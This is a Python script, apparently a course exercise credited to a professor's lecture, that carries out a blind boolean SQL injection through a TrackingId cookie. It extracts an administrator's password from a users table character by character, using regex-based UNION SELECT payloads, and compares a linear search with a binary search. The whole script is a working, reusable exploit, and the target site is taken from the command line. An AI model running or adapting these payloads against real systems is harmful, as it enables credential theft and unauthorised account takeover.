#this program tricks the target(application) into running query by manipulating input.  
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time
import string

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'

def try_query(query):
    """Accesses level site specified using a cookie that contains a specified query string. 
    Function URL-encodes the query and then attaches it to tracking cookie. 
    If cookie results in 'valid' query'Welcome back' string is returned.
    bool: cookie contains that query string
    """
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

def test_string(prefix, letter):
    """Accesses level site specified using a cookie that contains an exact query string. 
    Function URL-encodes the query and then attaches it to tracking cookie. If cookie results in 'valid' query
    'Welcome back' string is returned.
    Returns:
        bool: cookie contains that query string
    """
    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password ~ '^{prefix}{letter}$'-- "
    #print(f'Testing {prefix}, {letter}') 
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}

    resp = requests.get(url, cookies= mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        #print(f'Found character {letter}')
        return True
    else:
        return False

def test_string_Linear(uri,prefix, letter):
    """Accesses level site specified using a cookie that contains a specified query string. 
    Function URL-encodes the query and then attaches it to tracking cookie. If cookie results in 'valid' query
    'Welcome back' string is returned.
    Returns:
        bool: cookie contains that query string
    """
    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password ~ '^{prefix}{letter}'-- "
    #print(f'Linear Search findings: ^{prefix}{letter}') 
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}

    resp = requests.get(url, cookies= mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        #print(f'Found character {letter}')
        return True
    else:
        return False

def linearSearch():
    """Linear Search Function. Traverses string of charSet[a-z,0-9]
    Returns:
        string: string found from charSet[a-z, 0-9]
        This code came from Professor Wucheng's lecture
    """
    start_alpha = 'abcdefghijklmnopqrstuvwxyz0123456789'
    prefix = ''
    begin_time = time.perf_counter()

    while True:
        if test_string_Linear(url,prefix, '$'):
            break
        for letter in start_alpha:
            check = test_string_Linear(url,prefix, letter)
            if check:
                prefix += letter
                print (prefix)
                break

    print(f'Done. Found {prefix}')
    print(f"Time elapsed is {time.perf_counter()-begin_time}")

def bst(pw,charSet):
    """Binary Search Function. Traverses string of charSet[a-z,0-9]
    Args:
        pw (str): beginning of password to test
        charSet (str): characters to test for password
    Returns:
        char: character found charSet[a-z, 0-9]
    """
    #baseCase
    length =len(charSet) 
    val = charSet[0]
    if (len(charSet) == 1 ):
        #print(val)
        return val
    else:
        #get midpoint of list
        mid = len(charSet)//2

        #query= f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{pw}{charSet[:mid]}'--"""
        query = f"""x' UNION SELECT 'a' from users where username = 'administrator' and password ~ '^{pw}[{charSet[:mid]}]'--"""
        #query= f"""x' UNION SELECT 'a' from users where username = 'administrator' and password ~ '^[{pw}{charSet[:mid]}]'--"""
        #query= f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{pw}{charSet[:mid]}'--"""

        #if query is true then keep searching in the same half
        if try_query(query):
            return bst(pw,charSet[:mid])
        #if query returned false search other half
        else:
            return bst(pw,charSet[mid:])

def startSearch():
    """Search Function. Calls binary search function: bst() 
        and prints chars returned from bst(). 
    """
    #start with empty string password
    pw= ''
    charSet= string.ascii_lowercase + string.digits
    begin_time = time.perf_counter()
    while True:
        if test_string(pw,'$'):
            break
        char = bst(pw,charSet)
        pw += char
        print(pw)
    print(f'Done. Found {pw}')
    print(f"Time elapsed is {time.perf_counter()-begin_time}")



#main function call for Linear Search
linearSearch()

#main function call for bst    
startSearch()